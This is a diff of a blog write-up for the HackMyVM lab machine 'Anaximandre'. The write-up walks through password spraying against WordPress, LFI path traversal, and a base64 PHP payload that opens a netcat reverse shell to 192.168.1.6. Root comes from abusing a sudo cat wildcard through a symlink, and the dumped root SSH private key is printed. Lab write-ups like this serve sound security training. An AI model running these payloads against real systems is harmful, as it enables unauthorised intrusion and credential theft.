@@ -3,16 +3,17 @@ layout: post
 title:  "Anaximandre"
 date:   2022-12-14 00:00:00 +0100
 categories: hmv
-tags: ["worpress", "lfi"]
+tag: ["WordPress", "LFI"]
 ---
 # Anaximandre
 
-Tools : [[Anaximandre#NMAP nmap|NMAP]] [[Anaximandre#WPScan wpscan|WPScan]] [[Anaximandre#RSync rsync|RSync]]
-Skills :  [[Anaximandre#WP-Admin|WordPress]] [[Anaximandre#LFI lfi|LFI]]
+Creator: [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)
+Level: Medium
+Release Date: 2022-12-08
 
-## Enumeration 
+## Scan
 
-### NMAP #nmap
+### NMAP
 
 ```bash
 # Nmap 7.93 scan initiated Wed Dec 21 19:49:04 2022 as: nmap -sC -sV -oA nmap/Anaximandre -p- 192.168.1.23
@@ -36,10 +37,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Wed Dec 21 19:49:16 2022 -- 1 IP address (1 host up) scanned in 12.40 seconds
 ```
 
-### WPScan #wpscan 
+## Enumeration
+
+### WPScan
 
 ```bash
 $ wpscan --url "http://192.168.1.23"  --api-token TOKEN -P /usr/share/wordlists/rockyou.txt --detection-mode aggressive --plugins-detection aggressive -t 10
+```
+
+```
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -155,19 +161,17 @@ Interesting Finding(s):
 [+] Data Received: 19.453 MB
 [+] Memory used: 481.883 MB
 [+] Elapsed time: 00:09:57
-
-Scan Aborted: Canceled by User
 ```
 
 CREDENTIALS : webmaster : mickey
 
-## WP-Admin
+## WordPress Admin
 
-![[Anaximandre_01.png]]
+<img src="https://drive.google.com/uc?id=1OXOcmcLUsxboro0i220NMQs8Q4NoqpWA"/>
 
 INFO : Yn89m1RFBJ
 
-## RSync #rsync
+## RSync
 
 ```bash
 $ rsync rsync://192.168.1.23/share_rsync
@@ -198,7 +202,7 @@ new user: name=chaz, UID=1001, GID=1001, home=/home/chaz, shell=/bin/bash, from=
 INFO : Subdomain : lovegeografia.anaximandre.hmv
 USER : chaz
 
-## LFI #lfi
+## LFI
 
 ```html
 http://lovegeografia.anaximandre.hmv/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd
@@ -209,7 +213,7 @@ $ echo -n "<?php system('nc -e /bin/bash 192.168.1.6 4444'); ?>" | base64
 PD9waHAgc3lzdGVtKCduYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4xLjYgNDQ0NCcpOyA/Pg==
 ```
 
-REVERSE SHELL
+### REVERSE SHELL - (CVE-2022-32409)
 
 ```
 http://lovegeografia.anaximandre.hmv/exemplos/codemirror.php?&pagina=data://text/plain;base64,PD9waHAgc3lzdGVtKCduYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4xLjYgNDQ0NCcpOyA/Pg==
@@ -223,7 +227,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-## Priviledge Escalation #rsync
+## Priviledge Escalation
 
 ```bash
 cat /etc/rsyncd.auth
@@ -232,21 +236,8 @@ chaz:alanamorrechazado
 
 ```bash
 $ ssh chaz@192.168.1.23                                        
-The authenticity of host '192.168.1.23 (192.168.1.23)' can't be established.
-ED25519 key fingerprint is SHA256:o85UBW33V2ugBn//KUDlZfvvNNdrOBdQeG6ka39U7Bs.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '192.168.1.23' (ED25519) to the list of known hosts.
-chaz@192.168.1.23's password: 
 Linux anaximandre.hmv 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
 
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Thu Dec  8 18:15:03 2022 from 192.168.0.10
 chaz@anaximandre:~$ ls -la
 total 28                                                                                                                                                                
 drwxr-xr-x 3 chaz chaz 4096 Nov 27 16:45 .                                                                                                                              
@@ -257,14 +248,9 @@ lrwxrwxrwx 1 root root    9 Nov 26 16:48 .bash_history -> /dev/null
 -rw-r--r-- 1 chaz chaz  807 Nov 26 16:16 .profile
 drwx------ 2 chaz chaz 4096 Nov 27 15:54 .ssh
 -rwx------ 1 chaz chaz   33 Nov 26 16:48 user.txt
-
-chaz@anaximandre:~$ cat user.txt 
-d151c8ace0dbdd0ef23a3e3200f696f1
 ```
 
-USER FLAG : d151c8ace0dbdd0ef23a3e3200f696f1
-
-## ROOT #cat
+## ROOT
 
 ```bash
 chaz@anaximandre:~$ sudo -l
@@ -276,7 +262,7 @@ User chaz may run the following commands on anaximandre:
 
 ```
 
-Soft Link + CAT
+### Soft Link
 
 ```bash
 chaz@anaximandre:~$ ln -s /root/.ssh/id_rsa .
@@ -291,19 +277,7 @@ lrwxrwxrwx 1 chaz chaz   17 Dec 27 07:00 id_rsa -> /root/.ssh/id_rsa
 -rw-r--r-- 1 chaz chaz  807 Nov 26 16:16 .profile
 drwx------ 2 chaz chaz 4096 Nov 27 15:54 .ssh
 -rwx------ 1 chaz chaz   33 Nov 26 16:48 user.txt
-chaz@anaximandre:~$ cat id_rsa 
-cat: id_rsa: Permission denied
-chaz@anaximandre:~$ sudo cat id_rsa 
 
-We trust you have received the usual lecture from the local System
-Administrator. It usually boils down to these three things:
-
-    #1) Respect the privacy of others.
-    #2) Think before you type.
-    #3) With great power comes great responsibility.
-
-[sudo] password for chaz: 
-Sorry, user chaz is not allowed to execute '/usr/bin/cat id_rsa' as root on anaximandre.hmv.
 chaz@anaximandre:~$ sudo cat /home/chaz/*
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
@@ -343,8 +317,6 @@ Y1aew2FaQABKsxthX/fY7IJgcYuyWxcKEGOCpU51MrvRVcYF/irDJqzoJpnOiMcspPwBm0
 gX2Wvo5gZGNuBg7sgrt3liqXKQzM0xheKX/Tvh0WkhGH8Y5cWO9eYeGGnM9SnIUkzm9Gv4
 7ic/80uLk8snD5AAAAFHJvb3RAYW5heGltYW5kcmUuaG12AQIDBAUG
 -----END OPENSSH PRIVATE KEY-----
-d151c8ace0dbdd0ef23a3e3200f696f1
-chaz@anaximandre:~$ 
 ```
 
 ```bash
@@ -360,9 +332,7 @@ individual files in /usr/share/doc/*/copyright.
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 Last login: Sun Nov 27 16:44:45 2022 from 192.168.0.29
-root@anaximandre:~# cat root.txt 
-a3cbb8984cf5f19086595c6a2f569786
+
 root@anaximandre:~# 
 ```
 
-ROOT FLAG : a3cbb8984cf5f19086595c6a2f569786
